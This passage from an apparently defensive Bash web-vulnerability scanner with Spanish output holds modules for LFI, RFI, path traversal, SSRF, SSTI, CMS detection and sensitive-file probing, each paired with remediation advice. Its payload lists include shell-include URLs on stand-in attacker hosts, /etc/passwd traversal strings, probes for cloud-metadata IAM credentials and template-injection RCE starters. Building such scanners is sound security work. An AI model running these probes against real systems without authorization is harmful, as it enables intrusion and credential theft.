      if echo "$body" | grep -q "root:x:0:0\|root:!:0:0\|nobody:x\|\[extensions\]\|for 16-bit"; then
        add_finding "LFI01" "Local File Inclusion (LFI) confirmado" "CRITICO" "Local File Inclusion" \
          "El parámetro '${param}' permite incluir archivos locales del servidor. Se obtuvo contenido de archivos del sistema operativo. Puede derivar en RCE mediante log poisoning." \
          "URL: $url | Contenido de archivo del sistema detectado en respuesta" \
          "Usar un mapa de archivos permitidos (whitelist). Nunca usar input del usuario directamente en rutas de archivo. Deshabilitar allow_url_include en PHP."
        found=1; break 2
      fi
      # PHP wrapper detection
      if echo "$body" | grep -q "cmVvdDp\|BASE64\|PHAh" && echo "$payload" | grep -q "base64"; then
        add_finding "LFI02" "LFI con PHP Wrapper detectado" "CRITICO" "Local File Inclusion" \
          "El parámetro '${param}' procesa wrappers PHP (php://filter), permitiendo leer archivos codificados en base64 y potencialmente el código fuente de la aplicación." \
          "URL: $url | Respuesta contiene datos codificados en base64" \
          "Deshabilitar wrappers PHP inseguros. Usar open_basedir en php.ini. Validar extensiones de archivo permitidas."
        found=1; break 2
      fi
    done
    [[ $found -eq 1 ]] && break
  done

  [[ $found -eq 0 ]] && ok "No se detectaron indicadores de LFI en las pruebas realizadas"
}

# ════════════════════════════════════════════════════════════════════
# MÓDULO 6 — RFI (Remote File Inclusion)
# ════════════════════════════════════════════════════════════════════
scan_rfi() {
  section "REMOTE FILE INCLUSION (RFI)"
  local found=0
  local -a rfi_params=("file" "page" "include" "path" "url" "src" "template" "load" "view")
  local -a rfi_payloads=(
    "http://169.254.169.254/latest/meta-data/"
    "https://www.google.com/"
    "http://evil.example.com/shell.php"
    "ftp://evil.example.com/shell.php"
    "\\\\attacker.com\\share\\shell.php"
  )

  for param in "${rfi_params[@]}"; do
    for payload in "${rfi_payloads[@]}"; do
      local url=$(add_test_param "$TARGET_URL" "$param" "$payload")
      local body code
      local resp
      resp=$(hget "$url")
      body=$(get_body "$resp")
      code=$(get_code "$resp")
      # Detectar si cargó contenido externo o metadata AWS
      if echo "$body" | grep -q "ami-id\|instance-id\|hostname\|local-ipv4"; then
        add_finding "RFI01" "Remote File Inclusion + SSRF a metadata cloud" "CRITICO" "Remote File Inclusion" \
          "El parámetro '${param}' carga URLs remotas y accede al servicio de metadatos cloud (169.254.169.254). Puede comprometer credenciales IAM y el servidor completo." \
          "URL: $url | Contenido de metadatos cloud detectado en respuesta" \
          "Deshabilitar allow_url_include y allow_url_fopen en PHP. Validar y restringir URLs mediante whitelist. Implementar IMDSv2 en AWS."
        found=1; break 2
      fi
      if echo "$body" | grep -q "<title>Google\|<html>.*google\|<html lang" && echo "$payload" | grep -q "google"; then
        add_finding "RFI02" "Remote File Inclusion confirmado" "CRITICO" "Remote File Inclusion" \
          "El parámetro '${param}' incluye y ejecuta/devuelve contenido de URLs remotas. Un atacante puede servir código PHP malicioso para RCE." \
          "URL: $url | Contenido de URL remota cargado y devuelto en la respuesta" \
          "Deshabilitar allow_url_include en php.ini. Usar whitelist de rutas. Actualizar a versiones de PHP que tengan esta opción desactivada por defecto."
        found=1; break 2
      fi
    done
    [[ $found -eq 1 ]] && break
  done

  [[ $found -eq 0 ]] && ok "No se detectaron indicadores de RFI en las pruebas realizadas"
}

# ════════════════════════════════════════════════════════════════════
# MÓDULO 7 — Path Traversal
# ════════════════════════════════════════════════════════════════════
scan_path_traversal() {
  section "PATH TRAVERSAL"
  local found=0
  local -a payloads=(
    "/../../../etc/passwd"
    "/..%2F..%2F..%2Fetc%2Fpasswd"
    "/....//....//etc/passwd"
    "/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
    "/%252e%252e/%252e%252e/etc/passwd"
    "/../../../windows/win.ini"
    "/..%5c..%5c..%5cwindows%5cwin.ini"
  )

  for payload in "${payloads[@]}"; do
    local url="${ROOT_URL}${payload}"
    local body
    body=$(get_body "$(hget "$url")")
    if echo "$body" | grep -q "root:x:0:0\|daemon:\|\[extensions\]\|for 16-bit app support"; then
      add_finding "PT01" "Path Traversal confirmado" "CRITICO" "Path Traversal" \
        "El servidor no valida correctamente las rutas de acceso, permitiendo navegar fuera del directorio raíz y leer archivos arbitrarios del sistema." \
        "URL: $url | Contenido de archivo del sistema en respuesta" \
        "Resolver rutas con realpath() y verificar que estén dentro del directorio base. Usar chroot jail. Sanitizar separadores de directorio (%2F, %5C, ../)."
      found=1; break
    fi
  done

  # Test con parámetros de ruta estáticos
  local -a static_params=("file" "doc" "download" "asset" "static" "img" "image" "f" "filename")
  for param in "${static_params[@]}"; do
    for payload in "${payloads[@]:0:4}"; do
      local url=$(add_test_param "$TARGET_URL" "$param" "$payload")
      local body
      body=$(get_body "$(hget "$url")")
      if echo "$body" | grep -q "root:x:0:0\|\[extensions\]"; then
        add_finding "PT02" "Path Traversal vía parámetro" "CRITICO" "Path Traversal" \
          "El parámetro '${param}' es vulnerable a Path Traversal. Se leyó un archivo del sistema fuera del directorio web." \
          "URL: $url | Lectura de archivo del sistema confirmada" \
          "Validar rutas con una lista blanca de archivos permitidos. Usar APIs de sistema de archivos seguras. Aplicar sandboxing."
        found=1; break 2
      fi
    done
    [[ $found -eq 1 ]] && break
  done

  [[ $found -eq 0 ]] && ok "No se detectaron indicadores de Path Traversal en las pruebas realizadas"
}

# ════════════════════════════════════════════════════════════════════
# MÓDULO 8 — SSRF (Server-Side Request Forgery)
# ════════════════════════════════════════════════════════════════════
scan_ssrf() {
  section "SERVER-SIDE REQUEST FORGERY (SSRF)"
  local found=0
  local -a ssrf_params=("url" "uri" "src" "href" "path" "dest" "redirect" "out" "target" "proxy" "callback" "endpoint" "webhook" "next" "continue" "data" "fetch")
  local -a ssrf_payloads=(
    "http://169.254.169.254/latest/meta-data/"
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
    "http://[::1]/"
    "http://localhost/"
    "http://127.0.0.1/"
    "http://0.0.0.0/"
    "http://2130706433/"
    "http://017700000001/"
    "dict://localhost:6379/"
    "ftp://localhost/"
  )

  for param in "${ssrf_params[@]}"; do
    for payload in "${ssrf_payloads[@]}"; do
      local url=$(add_test_param "$TARGET_URL" "$param" "$payload")
      local body code
      local resp
      resp=$(hget "$url")
      body=$(get_body "$resp")
      code=$(get_code "$resp")

      # Cloud metadata
      if echo "$body" | grep -q "ami-id\|instance-id\|local-hostname\|iam\|security-credentials"; then
        add_finding "SSRF01" "SSRF - Acceso a metadata cloud confirmado" "CRITICO" "SSRF" \
          "El parámetro '${param}' realiza peticiones HTTP del lado del servidor y puede acceder al servicio de metadatos cloud. Esto expone credenciales IAM/cloud y datos de configuración del servidor." \
          "Param: $param | Payload: $payload | Metadatos cloud en respuesta" \
          "Implementar IMDS v2 en AWS. Bloquear rangos 169.254.0.0/16 y 100.64.0.0/10 en firewall/iptables. Validar y hacer whitelist de URLs permitidas."
        found=1; break 2
      fi

      # Loopback access
      if echo "$body" | grep -qi "127.0.0.1\|localhost\|internal\|admin panel\|root@" && [[ "$code" == "200" ]]; then
        add_finding "SSRF02" "SSRF - Acceso a servicios internos" "ALTO" "SSRF" \
          "El parámetro '${param}' parece acceder a servicios internos de la red (localhost/127.0.0.1). Puede permitir pivotar hacia infraestructura interna no expuesta." \
          "Param: $param | Payload: $payload | Indicadores de acceso interno en respuesta" \
          "Validar URLs con whitelist. Usar resolución DNS interna separada. Segmentar la red interna."
        found=1; break 2
      fi
    done
    [[ $found -eq 1 ]] && break
  done

  [[ $found -eq 0 ]] && ok "No se detectaron indicadores de SSRF en las pruebas realizadas"
}

# ════════════════════════════════════════════════════════════════════
# MÓDULO 9 — SSTI (Server-Side Template Injection)
# ════════════════════════════════════════════════════════════════════
scan_ssti() {
  section "SERVER-SIDE TEMPLATE INJECTION (SSTI)"
  local found=0

  # ── Tabla de payloads por motor de plantillas ──────────────────
  # Formato: "payload|resultado_esperado|motor"
  # La estrategia es matemática: si {{7*7}} devuelve 49 → hay evaluación
  # Usamos expresiones cuyo resultado es inequívoco y no aparece en HTML normal
  local -a probes=(
    # ── Detección genérica (funciona en varios motores) ──
    "{{7*7}}|49|Generic/Jinja2/Twig"
    "\${7*7}|49|FreeMarker/Thymeleaf/EL"
    "#{7*7}|49|Ruby ERB/Slim"
    "<%= 7*7 %>|49|ERB/EJS/ASP"
    "{7*7}|49|Smarty"
    # ── Jinja2 / Python ──
    "{{7*'7'}}|7777777|Jinja2 (Python)"
    "{{config}}|Config|Jinja2 config object"
    "{{''.__class__.__mro__}}|type|Jinja2 Python RCE chain"
    # ── Twig (PHP) ──
    "{{7*'7'}}|49|Twig (PHP)"
    "{{_self.env.registerUndefinedFilterCallback}}|registerUndefined|Twig RCE"
    # ── FreeMarker (Java) ──
    "\${7*7}|49|FreeMarker"
    "\${'freemarker'.toUpperCase()}|FREEMARKER|FreeMarker string method"
    # ── Velocity (Java) ──
    "#set(\$x=7*7)\${x}|49|Velocity"
    # ── Smarty (PHP) ──
    "{math equation='7*7'}|49|Smarty math"
    "{php}echo 7*7;{/php}|49|Smarty PHP tag"
    # ── ERB (Ruby) ──
    "<%= 7*7 %>|49|Ruby ERB"
    # ── Mako (Python) ──
    "\${7*7}|49|Mako"
    # ── Pebble (Java) ──
    "{{7*7}}|49|Pebble"
    # ── Handlebars / Mustache (JS) ──
    "{{this.constructor}}|function|Handlebars prototype"
    # ── Nunjucks (JS) ──
    "{{range.constructor('return 7*7')()}}|49|Nunjucks"
  )

  # ── Parámetros más frecuentes donde aparece SSTI ──────────────
  local -a ssti_params=(
    "name" "q" "search" "query" "template" "view" "page" "msg"
    "message" "subject" "title" "content" "text" "input" "data"
    "username" "email" "greeting" "lang" "locale" "redirect"
    "error" "reason" "comment" "feedback" "description" "body"
  )

  # ─── Función auxiliar: test un parámetro+payload concreto ──────
  _test_ssti_param() {
    local base="$1" param="$2" payload="$3" expected="$4" engine="$5"
    local encoded_payload
    encoded_payload=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${payload}'))" 2>/dev/null || echo "$payload")
    local url
    url=$(add_test_param "$base" "$param" "$encoded_payload")

    # Confirmación de evaluación real (no solo reflejo): el resultado
    # esperado debe aparecer EN AUSENCIA del payload original literal.
    # Si el motor de plantillas no evalúa nada, una página que solo hace
    # eco del input (como muchos buscadores/formularios) deja el
    # payload intacto en el cuerpo — y si el "resultado esperado" da la
    # casualidad de ser una subcadena del propio payload (p.ej.
    # "registerUndefined" dentro de "registerUndefinedFilterCallback"),
    # ese mero reflejo bastaría para disparar un falso positivo. Exigir
    # que el payload literal YA NO esté en la respuesta es la forma
    # estándar de distinguir "se evaluó" de "se hizo eco sin evaluar".
    local ssti_confirmed
    ssti_confirmed() {
      local body="$1"
      echo "$body" | grep -qF "$expected" && ! echo "$body" | grep -qF "$payload"
    }

    # GET
    local body
    body=$(get_body "$(hget "$url")")
    if ssti_confirmed "$body"; then
      echo "GET|${param}|${payload}|${expected}|${engine}"
      return 0
    fi

    # POST application/x-www-form-urlencoded
    body=$(get_body "$(hpost "$base" "${param}=${encoded_payload}")")
    if ssti_confirmed "$body"; then
      echo "POST|${param}|${payload}|${expected}|${engine}"
      return 0
    fi

    # POST JSON
    body=$(get_body "$(hpost "$base" "{\"${param}\":\"${payload}\"}" \
           -H "Content-Type: application/json")")
    if ssti_confirmed "$body"; then
      echo "JSON|${param}|${payload}|${expected}|${engine}"
      return 0
    fi
    return 1
  }

  # ─── Recopilar base URLs a testear ────────────────────────────
  local -a test_bases=("$TARGET_URL")

  # Añadir base de la URL si tiene path
  local url_path
  url_path=$(echo "$TARGET_URL" | sed 's|https\?://[^/]*||')
  if [[ -n "$url_path" && "$url_path" != "/" ]]; then
    test_bases+=("${TARGET_URL%%\?*}")
  fi

  # Detectar formularios y añadir sus action como bases adicionales
  local page_body
  page_body=$(get_body "$(hget "$TARGET_URL")")
  local form_actions
  form_actions=$(echo "$page_body" | grep -oi 'action="[^"]*"' | cut -d'"' -f2 | head -5)
  while IFS= read -r action; do
    [[ -z "$action" ]] && continue
    [[ "$action" == /* ]] && action="${TARGET_PROTO}://${TARGET_HOST}${action}"
    [[ "$action" != http* ]] && action="${TARGET_URL%/*}/${action}"
    test_bases+=("$action")
  done <<< "$form_actions"

  # Añadir endpoints comunes de APIs
  local -a api_paths=("/search" "/api/search" "/render" "/preview" "/template" "/api/message" "/contact" "/api/render")
  for ap in "${api_paths[@]}"; do
    test_bases+=("${TARGET_PROTO}://${TARGET_HOST}${ap}")
  done

  # ─── Test de URL con parámetros existentes ─────────────────────
  local url_params
  url_params=$(echo "$TARGET_URL" | grep -oP '(?<=\?)[^#]*')
  if [[ -n "$url_params" ]]; then
    local base_no_qs="${TARGET_URL%%\?*}"
    IFS='&' read -ra existing_pairs <<< "$url_params"
    for pair in "${existing_pairs[@]:0:4}"; do
      local pname="${pair%%=*}"
      for probe_entry in "${probes[@]:0:8}"; do
        IFS='|' read -r payload expected engine <<< "$probe_entry"
        local encoded
        encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${payload}'))" 2>/dev/null || echo "$payload")
        local new_qs
        new_qs=$(echo "$url_params" | sed "s/${pname}=[^&]*/${pname}=${encoded}/")
        local body
        body=$(get_body "$(hget "${base_no_qs}?${new_qs}")")
        if echo "$body" | grep -qF "$expected"; then
          add_finding "SSTI01" "SSTI confirmado — Motor: ${engine}" "CRITICO" "Server-Side Template Injection" \
            "El parámetro '${pname}' es procesado por un motor de plantillas del servidor (${engine}). La expresión '${payload}' fue evaluada y devolvió '${expected}'. Esto permite ejecución de código arbitrario en el servidor (RCE), extracción de variables de entorno, secretos y credenciales." \
            "URL: ${base_no_qs}?${new_qs} | Payload: ${payload} | Resultado evaluado: ${expected} | Motor: ${engine}" \
            "Nunca renderizar input del usuario directamente en plantillas. Usar sandboxing del motor (Jinja2 SandboxedEnvironment). Aplicar una whitelist estricta de caracteres. En Jinja2: evitar render_template_string() con datos del usuario."
          found=1; break 2
        fi
      done
    done
  fi

  # ─── Test por parámetros comunes en las bases ──────────────────
  if [[ $found -eq 0 ]]; then
    for base in "${test_bases[@]:0:5}"; do
      for param in "${ssti_params[@]:0:10}"; do
        for probe_entry in "${probes[@]:0:10}"; do
          IFS='|' read -r payload expected engine <<< "$probe_entry"
          local hit
          hit=$(_test_ssti_param "$base" "$param" "$payload" "$expected" "$engine" 2>/dev/null)
          if [[ -n "$hit" ]]; then
            IFS='|' read -r method hit_param hit_payload hit_expected hit_engine <<< "$hit"
            add_finding "SSTI01" "SSTI confirmado — Motor: ${hit_engine}" "CRITICO" "Server-Side Template Injection" \
              "El parámetro '${hit_param}' (método ${method}) es vulnerable a SSTI con el motor ${hit_engine}. La expresión '${hit_payload}' devolvió '${hit_expected}' tras ser evaluada por el servidor. Esto es equivalente a RCE: el atacante puede ejecutar comandos del sistema, leer archivos y robar credenciales." \
              "Base: ${base} | Parámetro: ${hit_param} | Método: ${method} | Payload: ${hit_payload} → ${hit_expected} | Motor: ${hit_engine}" \
              "Nunca pasar input del usuario directamente a render() o eval() de un motor de plantillas. Usar sandboxing estricto. Separar datos de la lógica de presentación. Revisar uso de render_template_string (Flask/Jinja2), twig->render() (PHP), Template.render() (Java)."
            found=1; break 3
          fi
        done
      done
      [[ $found -eq 1 ]] && break
    done
  fi

  # ─── Test de header injection (User-Agent, Referer, X-Forwarded-For) ──
  if [[ $found -eq 0 ]]; then
    local -a ssti_headers=("User-Agent" "Referer" "X-Forwarded-For" "X-Custom-Header" "Accept-Language")
    for hdr in "${ssti_headers[@]}"; do
      local body
      body=$(get_body "$(curl -sk --max-time $TIMEOUT \
             -H "${hdr}: {{7*7}}" \
             -w "\n###CODE###%{http_code}" \
             "$TARGET_URL" 2>/dev/null)")
      if echo "$body" | grep -qF "49"; then
        add_finding "SSTI02" "SSTI en cabecera HTTP: ${hdr}" "CRITICO" "Server-Side Template Injection" \
          "La cabecera HTTP '${hdr}' es procesada por un motor de plantillas sin sanitizar. El payload {{7*7}} devuelve 49, confirmando evaluación de expresiones en el servidor." \
          "Cabecera: ${hdr}: {{7*7}} → respuesta contiene '49'" \
          "Sanitizar y no renderizar cabeceras HTTP en plantillas del servidor. Revisar logs de acceso y middleware que procesen cabeceras HTTP."
        found=1; break
      fi
    done
  fi

  # ─── Test de path injection ────────────────────────────────────
  if [[ $found -eq 0 ]]; then
    local -a path_probes=("{{7*7}}" "\${7*7}" "#{7*7}" "<%= 7*7 %>")
    for pp in "${path_probes[@]}"; do
      local enc_pp
      enc_pp=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${pp}'))" 2>/dev/null || echo "$pp")
      local body
      body=$(get_body "$(hget "${ROOT_URL}/${enc_pp}")")
      if echo "$body" | grep -qF "49"; then
        add_finding "SSTI03" "SSTI en segmento de ruta URL" "CRITICO" "Server-Side Template Injection" \
          "Un segmento del path URL es evaluado por el motor de plantillas. El payload '${pp}' en la ruta devuelve 49." \
          "URL: ${ROOT_URL}/${pp} → respuesta contiene '49'" \
          "Validar y sanitizar todos los segmentos de URL antes de pasarlos a plantillas. No usar rutas dinámicas sin escape."
        found=1; break
      fi
    done
  fi

  # ─── Heurística: detectar tecnologías que usan plantillas ──────
  if [[ $found -eq 0 ]]; then
    local tech_headers
    tech_headers=$(hhead "$TARGET_URL")
    local engine_hint=""
    echo "$tech_headers" | grep -qi "python\|flask\|django\|jinja" && engine_hint="Jinja2/Flask/Django (Python)"
    echo "$tech_headers" | grep -qi "php\|laravel\|symfony\|twig"   && engine_hint="Twig/Blade/Smarty (PHP)"
    echo "$tech_headers" | grep -qi "ruby\|rails\|sinatra"          && engine_hint="ERB (Ruby)"
    echo "$tech_headers" | grep -qi "java\|spring\|tomcat\|freemarker\|thymeleaf" && engine_hint="FreeMarker/Thymeleaf (Java)"
    echo "$tech_headers" | grep -qi "node\|express\|handlebars\|nunjucks\|pug"    && engine_hint="Handlebars/Nunjucks/Pug (Node.js)"

    if [[ -n "$engine_hint" ]]; then
      add_finding "SSTI04" "Tecnología de plantillas detectada — Revisar SSTI manualmente" "MEDIO" "Server-Side Template Injection" \
        "Se ha detectado una tecnología que usa motores de plantillas en el servidor (${engine_hint}). No se confirmó SSTI automáticamente, pero se recomienda revisión manual en profundidad de todos los puntos donde se procese input del usuario." \
        "Cabeceras del servidor indican: ${engine_hint}" \
        "Auditar manualmente todos los puntos de entrada de datos: formularios, parámetros URL, cabeceras HTTP. Revisar si se usa render_template_string(), twig->render(), Template().render() con datos del usuario."
      found=1
    fi
  fi

  [[ $found -eq 0 ]] && ok "No se detectaron indicadores de SSTI en las pruebas realizadas"
}

# ════════════════════════════════════════════════════════════════════
# MÓDULO 10 — CMS Detection
# ════════════════════════════════════════════════════════════════════
scan_cms() {
  section "DETECCIÓN DE CMS Y TECNOLOGÍAS"
  local found_cms=0
  local body headers
  body=$(get_body "$(hget "$TARGET_URL")")
  headers=$(hhead "$TARGET_URL")

  # WordPress
  if echo "$body $headers" | grep -qi "wp-content\|wp-includes\|WordPress\|/wp-json"; then
    found_cms=1
    add_finding "CMS01" "WordPress detectado" "INFO" "CMS Detection" \
      "Se detectó WordPress como CMS. Los sitios WordPress son el objetivo más frecuente de ataques automatizados." \
      "Indicadores: wp-content/, wp-includes/, meta generator WordPress" \
      "Mantener WordPress, themes y plugins actualizados. Ocultar versión (remove_action generator). Usar plugin de seguridad (Wordfence). Proteger wp-admin con 2FA."

    # WP versión
    local wp_ver
    wp_ver=$(echo "$body" | grep -oP "WordPress\s+\K[\d.]+" | head -1)
    [[ -n "$wp_ver" ]] && add_finding "CMS02" "Versión WordPress expuesta: $wp_ver" "BAJO" "CMS Detection" \
      "La versión de WordPress es visible públicamente, facilitando la búsqueda de vulnerabilidades específicas." \
      "Meta generator: WordPress $wp_ver" \
      "Eliminar la etiqueta meta generator. Añadir remove_action('wp_head','wp_generator') en functions.php."

    # WP xmlrpc
    local xmlrpc_resp
    xmlrpc_resp=$(hget "${ROOT_URL}/xmlrpc.php")
    if echo "$(get_code "$xmlrpc_resp")" | grep -q "200\|405"; then
      add_finding "CMS03" "WordPress xmlrpc.php expuesto" "ALTO" "CMS Detection" \
        "El archivo xmlrpc.php de WordPress está accesible. Puede usarse para ataques de fuerza bruta amplificados y SSRF." \
        "URL: ${ROOT_URL}/xmlrpc.php accesible (HTTP $(get_code "$xmlrpc_resp"))" \
        "Deshabilitar xmlrpc.php si no se usa: add_filter('xmlrpc_enabled','__return_false'). Bloquear en .htaccess o NGINX."
    fi

    # WP readme
    if [[ "$(get_code "$(hget "${ROOT_URL}/readme.html")")" == "200" ]]; then
      add_finding "CMS04" "WordPress readme.html expuesto" "BAJO" "CMS Detection" \
        "El archivo readme.html revela información de versión y es innecesario en producción." \
        "URL: ${ROOT_URL}/readme.html accesible" \
        "Eliminar readme.html, license.txt y wp-config-sample.php en entornos de producción."
    fi
  fi

  # Joomla
  if echo "$body" | grep -qi "joomla\|mosConfig\|/components/com_"; then
    found_cms=1
    add_finding "CMS10" "Joomla! detectado" "INFO" "CMS Detection" \
      "Se detectó Joomla! como CMS. Requiere actualizaciones regulares de core, plantillas y extensiones." \
      "Indicadores: joomla, mosConfig, /components/com_" \
      "Mantener Joomla actualizado. Usar extensiones de seguridad. Proteger /administrator con restricción de IP."
  fi

  # Drupal
  if echo "$body $headers" | grep -qi "drupal\|Drupal"; then
    found_cms=1
    add_finding "CMS11" "Drupal detectado" "INFO" "CMS Detection" \
      "Se detectó Drupal como CMS." \
      "Indicadores: drupal en body o cabeceras" \
      "Aplicar parches de seguridad (Drupalgeddon). Revisar permisos de módulos. Activar módulo Security Kit."
  fi

  # phpMyAdmin
  local pma_resp
  pma_resp=$(get_code "$(hget "${ROOT_URL}/phpmyadmin")")
  if [[ "$pma_resp" == "200" ]]; then
    add_finding "CMS20" "phpMyAdmin expuesto" "CRITICO" "CMS Detection" \
      "phpMyAdmin es accesible públicamente. Permite administrar la base de datos completa si se comprometen las credenciales." \
      "URL: ${ROOT_URL}/phpmyadmin - HTTP 200" \
      "Restringir phpMyAdmin por IP o VPN. Nunca exponer en Internet. Cambiar la ruta por defecto."
  fi

  # Detectar tecnologías por cabeceras
  local tech_info=""
  echo "$headers" | grep -qi "php" && tech_info+="PHP "
  echo "$headers" | grep -qi "asp\|aspnet\|\.net" && tech_info+="ASP.NET "
  echo "$headers" | grep -qi "ruby\|rails" && tech_info+="Ruby/Rails "
  echo "$headers" | grep -qi "python\|django\|flask" && tech_info+="Python "
  echo "$headers" | grep -qi "node\|express" && tech_info+="Node.js "
  echo "$headers" | grep -qi "java\|tomcat\|jetty" && tech_info+="Java "

  [[ -n "$tech_info" ]] && add_finding "CMS30" "Tecnologías del servidor detectadas: $tech_info" "INFO" "CMS Detection" \
    "Se identificaron las tecnologías del servidor, lo que ayuda a los atacantes a buscar vulnerabilidades específicas." \
    "Cabeceras: $tech_info detectado en respuestas HTTP" \
    "Eliminar o minimizar cabeceras que revelen versiones y tecnologías. Aplicar oscuridad como capa adicional."

  # Robots.txt y Sitemap
  local robots_code
  robots_code=$(get_code "$(hget "${ROOT_URL}/robots.txt")")
  if [[ "$robots_code" == "200" ]]; then
    local disallowed
    disallowed=$(get_body "$(hget "${ROOT_URL}/robots.txt")" | grep -i "Disallow:" | head -5)
    if [[ -n "$disallowed" ]]; then
      add_finding "CMS31" "Directorios sensibles en robots.txt" "BAJO" "CMS Detection" \
        "El archivo robots.txt revela rutas internas que el administrador no quiere indexar, pero que pueden ser objetivos de ataque." \
        "Disallowed paths encontrados: $disallowed" \
        "Revisar que ninguna ruta en Disallow revele información sensible. Considerar no publicar robots.txt."
    fi
  fi

  [[ $found_cms -eq 0 ]] && ok "No se identificó un CMS conocido"
}

# ════════════════════════════════════════════════════════════════════
# MÓDULO 11 — Archivos y rutas sensibles expuestas
# ════════════════════════════════════════════════════════════════════
scan_sensitive_files() {
  section "ARCHIVOS Y RUTAS SENSIBLES"
  local -a sensitive_paths=(
    "/.git/HEAD" "/.git/config" "/.env" "/.env.local" "/.env.production"
    "/config.php" "/config/database.yml" "/wp-config.php" "/configuration.php"
    "/admin" "/administrator" "/admin.php" "/admin/login"
    "/backup" "/backup.zip" "/backup.tar.gz" "/db.sql" "/database.sql"
    "/phpinfo.php" "/info.php" "/test.php" "/debug.php"
    "/.htaccess" "/web.config" "/server-status" "/server-info"
    "/api/v1/users" "/api/users" "/api/admin"
    "/actuator" "/actuator/env" "/actuator/mappings"
    "/console" "/h2-console" "/_profiler"
  )

  local found_any=0
  for path in "${sensitive_paths[@]}"; do
    local url="${ROOT_URL}${path}"
    local resp code body
    resp=$(hget "$url")
    code=$(get_code "$resp")
    body=$(get_body "$resp")
    if [[ "$code" == "200" || "$code" == "301" || "$code" == "302" ]]; then
      local severity="MEDIO"
      local desc="Archivo/ruta accesible que puede revelar información sensible."
      local rec="Restringir acceso con autenticación o bloquear en configuración del servidor web."

      case "$path" in
        *\.git*) severity="CRITICO"; desc="Repositorio Git expuesto. Un atacante puede descargar el código fuente completo incluyendo credenciales, tokens y lógica de negocio."
                 rec="Denegar acceso a /.git/ en el servidor web. En NGINX: location /.git { deny all; }. En Apache: <Directory .git> Deny from all </Directory>";;
        *\.env*) severity="CRITICO"; desc="Archivo .env expuesto. Contiene variables de entorno con credenciales de BBDD, claves API, secretos de aplicación."
                 rec="Mover .env fuera del document root. Añadir a .gitignore. Denegar acceso a archivos .env en el servidor web.";;
        *phpinfo*|*info.php*) severity="ALTO"; desc="phpinfo() expuesto. Revela configuración PHP, rutas, módulos, variables de entorno y parámetros del servidor."
                 rec="Eliminar o proteger archivos de diagnóstico en producción.";;
        *wp-config*) severity="CRITICO"; desc="wp-config.php potencialmente accesible. Contiene credenciales de base de datos."
                 rec="Verificar permisos de wp-config.php (640). Mover fuera del document root si es posible.";;
        *actuator*) severity="ALTO"; desc="Spring Boot Actuator expuesto. Puede revelar configuración, dumps de memoria, variables de entorno."
                 rec="Asegurar los endpoints de Actuator con Spring Security. Exponer solo /health en producción.";;
        *backup*|*\.sql*|*\.zip*) severity="CRITICO"; desc="Archivo de backup accesible. Puede contener código fuente, dumps de BBDD y credenciales."
                 rec="Nunca almacenar backups en el document root. Moverlos a almacenamiento seguro fuera de la web.";;
      esac

      add_finding "SF_$(echo $path | tr -dc 'a-zA-Z0-9' | head -c6 | tr '[:lower:]' '[:upper:]')" \
        "Ruta sensible expuesta: $path" "$severity" "Archivos Sensibles" \
        "$desc" \
        "URL: $url | HTTP $code" \
        "$rec"
      found_any=1
    fi
  done

  [[ $found_any -eq 0 ]] && ok "No se detectaron archivos o rutas sensibles expuestos"
}

# ════════════════════════════════════════════════════════════════════
# MÓDULO 12 — Información adicional y fingerprinting
# ════════════════════════════════════════════════════════════════════
scan_fingerprint() {
  section "FINGERPRINTING E INFORMACIÓN ADICIONAL"
  local headers
  headers=$(hhead "$TARGET_URL")

  # Cookies sin flags de seguridad
  local cookies
  cookies=$(echo "$headers" | grep -i "set-cookie:" | head -5)
  if [[ -n "$cookies" ]]; then
    if echo "$cookies" | grep -qiv "httponly"; then
      add_finding "FP01" "Cookies sin flag HttpOnly" "ALTO" "Configuración" \
        "Las cookies de sesión no tienen el flag HttpOnly, por lo que pueden ser robadas mediante XSS (document.cookie)." \
        "$(echo "$cookies" | head -2 | tr '\n' '|')" \
        "Añadir HttpOnly a todas las cookies de sesión: Set-Cookie: session=...; HttpOnly; Secure; SameSite=Strict"
    fi
    if echo "$cookies" | grep -qiv "secure"; then
      add_finding "FP02" "Cookies sin flag Secure" "MEDIO" "Configuración" \
        "Las cookies no tienen el flag Secure, pudiendo transmitirse en texto claro por HTTP." \
        "$(echo "$cookies" | head -2 | tr '\n' '|')" \
        "Añadir Secure a todas las cookies. Forzar HTTPS en toda la aplicación."
    fi
    if echo "$cookies" | grep -qiv "samesite"; then
      add_finding "FP03" "Cookies sin atributo SameSite" "BAJO" "Configuración" \
        "Sin SameSite, las cookies pueden enviarse en peticiones cross-site, facilitando ataques CSRF." \
        "$(echo "$cookies" | head -2 | tr '\n' '|')" \
        "Añadir SameSite=Strict o SameSite=Lax a todas las cookies de sesión."
    fi
  fi

  # HTTPS redirect
  if [[ "$TARGET_PROTO" == "http" ]]; then
    local https_url="https://${TARGET_HOST}"
    local https_code
    https_code=$(get_code "$(hget "$https_url")")
    if [[ "$https_code" == "200" || "$https_code" == "301" || "$https_code" == "302" ]]; then
      # Verificar si http redirige a https automáticamente
      local redirect_loc
      redirect_loc=$(hhead "$TARGET_URL" | grep -i "^location:" | head -1)
      if ! echo "$redirect_loc" | grep -q "https://"; then
        add_finding "FP04" "HTTP no redirige automáticamente a HTTPS" "MEDIO" "Configuración" \
          "El sitio está disponible por HTTPS pero no fuerza la redirección desde HTTP. Los usuarios pueden conectarse sin cifrado." \
          "HTTP $TARGET_URL no redirige a HTTPS" \
          "Configurar redirección 301 de HTTP a HTTPS. En Apache: Redirect 301 / https://dominio.com/"
      fi
    fi
  fi

  # Directory listing
  local -a dir_paths=("/images/" "/uploads/" "/files/" "/backup/" "/assets/" "/static/" "/media/" "/docs/")
  for dpath in "${dir_paths[@]}"; do
    local body code
    local resp
    resp=$(hget "${ROOT_URL}${dpath}")
    code=$(get_code "$resp")
    body=$(get_body "$resp")
    if [[ "$code" == "200" ]] && echo "$body" | grep -qi "Index of\|Directory listing\|Parent Directory"; then
      add_finding "FP05" "Directory Listing habilitado en $dpath" "MEDIO" "Configuración" \
        "El servidor muestra el contenido del directorio ${dpath}, permitiendo enumerar y descargar archivos que no deberían ser accesibles." \
        "URL: ${ROOT_URL}${dpath} muestra listado de directorio" \
        "Deshabilitar Directory Listing. En Apache: Options -Indexes. En NGINX: autoindex off;"
      break
    fi
  done

  # Métodos HTTP peligrosos
  local allowed_methods
